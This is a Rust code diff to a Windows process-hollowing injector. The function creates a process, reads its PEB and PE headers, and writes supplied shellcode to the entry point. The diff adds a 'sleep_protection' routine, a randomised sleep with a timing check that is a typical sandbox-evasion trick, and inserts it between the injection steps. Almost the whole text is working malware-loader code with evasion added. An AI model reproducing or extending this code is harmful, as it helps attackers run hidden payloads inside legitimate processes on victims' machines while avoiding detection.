@@ -1,6 +1,8 @@
 use core::ffi::c_void;
+use rand;
 use std::mem::{size_of, MaybeUninit};
 use std::ptr;
+use std::{thread, time};
 use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, IMAGE_NT_HEADERS64},
@@ -142,6 +144,7 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
     let startup_info: STARTUPINFOA = unsafe { MaybeUninit::<STARTUPINFOA>::zeroed().assume_init() };
     let mut process_info: PROCESS_INFORMATION =
         unsafe { MaybeUninit::<PROCESS_INFORMATION>::zeroed().assume_init() };
+    println!("Creating process");
     let create_process = unsafe {
         CreateProcessA(
             ptr::null(),
@@ -162,6 +165,8 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
     println!("Created process: {:?}", process_info.hProcess);
 
     // 2. Locate PEB in created process
+    println!("2.");
+    sleep_protection();
     let mut nt_process_info = MaybeUninit::<PROCESS_BASIC_INFORMATION>::zeroed();
     let mut return_len: u32 = 0;
     let nt_process_info_result = unsafe {
@@ -180,6 +185,8 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
     // 3. Calculate image base position
     let ptr_to_image_base = nt_process_info_safe.PebBaseAddress as u64 + 0x10;
     // 4. Use that to read the process memory
+    sleep_protection();
+    println!("4.");
     let mut image_base_buffer = [0; size_of::<&u8>()];
     let mut bytes_read: usize = 0;
     let memory = unsafe {
@@ -196,6 +203,7 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
     }
     let target_base = usize::from_ne_bytes(image_base_buffer);
     // 5. extract EntryPoint from PE header at target_base
+    sleep_protection();
     let mut pe_header = MaybeUninit::<IMAGE_DOS_HEADER>::zeroed();
     let mut bytes_read: usize = 0;
     let memory = unsafe {
@@ -212,6 +220,7 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
         return Err("Couldn't read PE header");
     }
     // 6. Use EntryPoint offset to read memory
+    sleep_protection();
     let mut entrypoint = MaybeUninit::<IMAGE_NT_HEADERS64>::zeroed();
     let entrypoint_ptr_addr = target_base + (pe_header_safe.e_lfanew as usize);
     let mut bytes_read: usize = 0;
@@ -233,6 +242,7 @@ pub fn inject_hollow(exe_path: String, buf: Vec<u8>) -> Result<(), &'static str>
         entrypoint_safe.OptionalHeader.AddressOfEntryPoint
     );
     // 7. Write shellcode to the entrypoint
+    sleep_protection();
     let mut nb_written_bytes = 0;
     let shellcode = buf.as_ptr() as *const c_void;
     let entrypoint_addr =
@@ -302,4 +312,13 @@ pub fn find_process(process_name: String) -> Result<HANDLE, &'static str> {
         }
     }
     Err("Process not found :-(")
+}
+
+pub fn sleep_protection() {
+    let time_to_sleep = time::Duration::from_millis(rand::random::<u8>() as u64 + 1234u64);
+    let now = time::Instant::now();
+
+    thread::sleep(time_to_sleep);
+
+    assert!(now.elapsed() >= time_to_sleep);
 }
